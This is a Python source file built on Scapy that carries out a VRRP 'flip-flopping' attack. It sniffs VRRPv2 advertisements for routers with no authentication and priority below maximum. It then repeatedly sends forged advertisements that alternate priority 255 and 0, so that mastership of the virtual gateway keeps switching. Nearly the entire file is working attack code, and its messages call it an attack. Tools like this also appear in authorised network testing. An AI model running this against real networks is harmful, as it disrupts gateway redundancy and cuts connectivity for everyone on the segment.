import sys
import time
from scapy.all import *
from scapy.layers.vrrp import VRRP, VRRPv3
from colorama import *


def vrrp_flip_flopping(interface):
    try:
        print(Fore.YELLOW + f"    [!] Detecting VRRP routers...\n")  # Переведено
        global total, router_count, vrrp_advertisement_captured
        vrrp_routers = {}
        vrrp_advertisement_captured = False  # Не захвачен
        router_count = 1
        total = 0

        def packet_analyze(packet):
            global src_ip, src_mac, version, advert_interval, auth, total, router_count, vrrp_advertisement_captured
            if packet.haslayer(VRRPv3):  # Если это VRRPv3
                src_mac = packet[Ether].src
                src_ip = packet[IP].src
                version = packet[VRRPv3].version
                virtual_rid = packet[VRRPv3].vrid
                priority = packet[VRRPv3].priority
                if priority == 255:
                    output_priority = f"{Fore.RED}255 (max){Fore.GREEN}"
                else:
                    output_priority = priority
                advert_interval = packet[VRRPv3].adv
                auth = 0
                output_auth = "None"
                ip_addr = packet[VRRPv3].addrlist

                if src_ip in [router["IP"] for router in vrrp_routers.values()]:
                    pass
                else:
                    vrrp_routers[f"Router{router_count}"] = {"MAC": src_mac, "IP": src_ip, "Version": version,
                                                             "Virtual Router ID": virtual_rid,
                                                             "Priority": priority,
                                                             "Advertisement Interval": advert_interval,
                                                             "Auth": auth,
                                                             "Virtual IP Address": ip_addr}
                    router_count += 1
                    print(Fore.GREEN + f"    [+] [VRRP Router detected]\n         MAC: {src_mac.upper()}\n"
                                       f"         IP: {src_ip}\n         Version: {Fore.RED}{version} (Temporarily unsupported){Fore.GREEN}\n"
                                       f"         Virtual Router ID: {virtual_rid}\n         Priority: {output_priority}\n         Advertisement Interval: {advert_interval} (cs)\n         Auth: {output_auth}\n"
                                       f"         Virtual IP Address: {ip_addr}\n")  # Переведено

            if packet.haslayer(VRRP):  # Если это VRRPv2
                src_mac = packet[Ether].src
                src_ip = packet[IP].src
                version = packet[VRRP].version
                virtual_rid = packet[VRRP].vrid
                priority = packet[VRRP].priority
                if priority == 255:
                    output_priority = f"{Fore.RED}255 (max){Fore.GREEN}"
                else:
                    output_priority = priority
                advert_interval = packet[VRRP].adv
                auth = packet[VRRP].authtype
                if auth == 1:
                    output_auth = f"{Fore.RED}Plain Text (Temporarily unsupported){Fore.GREEN}"
                elif auth == 254:
                    output_auth = f"{Fore.RED}MD5 (Temporarily unsupported){Fore.GREEN}"
                elif auth == 0:
                    output_auth = "None"
                ip_addr = packet[VRRP].addrlist

                if src_ip in [router["IP"] for router in vrrp_routers.values()]:
                    pass
                else:
                    if auth == 0:  # Если нет аутентификации
                        vrrp_routers[f"Router{router_count}"] = {"MAC": src_mac, "IP": src_ip, "Version": version,
                                                                 "Virtual Router ID": virtual_rid,
                                                                 "Priority": priority,
                                                                 "Advertisement Interval": advert_interval,
                                                                 "Auth": auth,
                                                                 "Virtual IP Address": ip_addr}
                        router_count += 1
                        vrrp_advertisement_captured = True
                        print(Fore.GREEN + f"    [+] [VRRP Router detected]\n         MAC: {src_mac.upper()}\n         IP: {src_ip}\n         Version: {version}\n"
                                         f"         Virtual Router ID: {virtual_rid}\n         Priority: {output_priority}\n         Advertisement Interval: {advert_interval} (sec)\n         Auth: {output_auth}\n"
                                         f"         Virtual IP Address: {ip_addr}\n")  # Переведено

                    else:
                        vrrp_routers[f"Router{router_count}"] = {"MAC": src_mac, "IP": src_ip, "Version": version,
                                                                 "Virtual Router ID": virtual_rid,
                                                                 "Priority": priority,
                                                                 "Advertisement Interval": advert_interval,
                                                                 "Auth": auth,
                                                                 "Virtual IP Address": ip_addr}
                        router_count += 1
                        print(Fore.GREEN + f"    [+] [VRRP Router detected]\n         MAC: {src_mac.upper()}\n         IP: {src_ip}\n         Version: {version}\n"
                                         f"         Virtual Router ID: {virtual_rid}\n         Priority: {output_priority}\n         Advertisement Interval: {advert_interval} (sec)\n         Auth: {output_auth}\n"
                                         f"         Virtual IP Address: {ip_addr}\n")  # Переведено

        sniffer = AsyncSniffer(filter="ip proto 112", iface=interface, prn=packet_analyze, timeout=5)
        sniffer.start()
        time.sleep(6)

        vrrp_routers = {name: config for name, config in vrrp_routers.items()
                        if config.get('Version') != 3 and config.get('Auth') == 0 and config.get('Priority') != 255}

        if vrrp_advertisement_captured == False:
            print(Fore.RED + f"    [-] %ERROR: No VRRPv2 routers detected (attack aborted)")  # Переведено
            print(Fore.RED + f"    [-] %ERROR: Possible VRRP routers using AUTHENTICATION, MAX PRIORITY, or unsupported VRRP VERSION")  # Переведено
        else:
            if vrrp_routers != {}:
                try:
                    while True:
                        for router in list(vrrp_routers):
                            vrid = vrrp_routers[router]['Virtual Router ID']
                            inter = vrrp_routers[router]['Advertisement Interval']
                            virt_ip = vrrp_routers[router]['Virtual IP Address']

                            vrid_hex = format(vrid, 'x')
                            virt_mac = "00:00:5e:00:01:" + vrid_hex

                            fake_vrrp_advertisement = Ether(src=virt_mac, dst="01:00:5e:00:00:12") / \
                                                      IP(dst="224.0.0.18", ttl=255) / \
                                                      VRRP(version=2, type=1, vrid=vrid, priority=255, authtype=0,
                                                           adv=inter, addrlist=virt_ip)

                            sendp(fake_vrrp_advertisement, iface=interface, count=1, verbose=False)
                            time.sleep(1)
                            fake_vrrp_advertisement = Ether(src=virt_mac, dst="01:00:5e:00:00:12") / \
                                                      IP(dst="224.0.0.18", ttl=255) / \
                                                      VRRP(version=2, type=1, vrid=vrid, priority=0, authtype=0,
                                                           adv=inter, addrlist=virt_ip)

                            sendp(fake_vrrp_advertisement, iface=interface, count=1, verbose=False)
                            time.sleep(1)

                            total += 2
                            print(Fore.GREEN + f"    [+] Sent VRRP Advertisement with modified priority value: {total}", end="\r")  # Переведено

                except KeyboardInterrupt:
                    print(Fore.YELLOW + f"\n    [!] Attack stopped (User pressed Ctrl + C)")  # Переведено

            else:
                print(Fore.RED + f"    [-] %ERROR: No VRRPv2 routers detected (attack aborted)")  # Переведено
                print(Fore.RED + f"    [-] %ERROR: Possible VRRP routers using AUTHENTICATION, MAX PRIORITY, or unsupported VRRP VERSION")  # Переведено

    except KeyboardInterrupt:
        print(Fore.YELLOW + f"\n    [!] Attack stopped (User pressed Ctrl + C)")  # Переведено